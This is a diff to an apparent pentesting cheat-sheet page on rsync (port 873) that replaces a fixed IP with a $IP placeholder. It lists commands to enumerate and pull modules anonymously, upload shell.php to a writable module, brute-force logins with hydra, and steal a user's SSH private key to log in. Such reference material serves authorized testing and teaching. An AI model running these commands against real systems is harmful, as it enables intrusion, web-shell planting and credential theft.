@@ -1,15 +1,15 @@
 # Rsync (873)
 
 !!! tip "Start here"
-    List modules anonymously: `rsync -av --list-only rsync://10.10.10.10`. If modules appear, pull them without credentials: `rsync -av rsync://10.10.10.10/<module> ./`. Look for SSH keys, config backups, and database dumps in what comes back.
+    List modules anonymously: `rsync -av --list-only rsync://$IP`. If modules appear, pull them without credentials: `rsync -av rsync://$IP/<module> ./`. Look for SSH keys, config backups, and database dumps in what comes back.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 873 --script rsync-list-modules 10.10.10.10
-rsync -av --list-only rsync://10.10.10.10
+nmap -p 873 --script rsync-list-modules $IP
+rsync -av --list-only rsync://$IP
 ```
 
 ---
@@ -18,10 +18,10 @@ rsync -av --list-only rsync://10.10.10.10
 
 ```bash
 # Entire module
-rsync -av rsync://10.10.10.10/<module> ./loot/
+rsync -av rsync://$IP/<module> ./loot/
 
 # Single file
-rsync -av rsync://10.10.10.10/<module>/path/to/file.txt ./
+rsync -av rsync://$IP/<module>/path/to/file.txt ./
 ```
 
 ---
@@ -31,7 +31,7 @@ rsync -av rsync://10.10.10.10/<module>/path/to/file.txt ./
 If the module is writable:
 
 ```bash
-rsync -av ./shell.php rsync://10.10.10.10/<module>/path/
+rsync -av ./shell.php rsync://$IP/<module>/path/
 ```
 
 ---
@@ -39,7 +39,7 @@ rsync -av ./shell.php rsync://10.10.10.10/<module>/path/
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt rsync://10.10.10.10
+hydra -L users.txt -P passwords.txt rsync://$IP
 ```
 
 ---
@@ -49,9 +49,9 @@ hydra -L users.txt -P passwords.txt rsync://10.10.10.10
 If home directories are exposed:
 
 ```bash
-rsync -av rsync://10.10.10.10/<module>/home/user/.ssh/id_rsa ./
+rsync -av rsync://$IP/<module>/home/user/.ssh/id_rsa ./
 chmod 600 id_rsa
-ssh -i id_rsa user@10.10.10.10
+ssh -i id_rsa user@$IP
 ```
 
 !!! tip "Real-world"
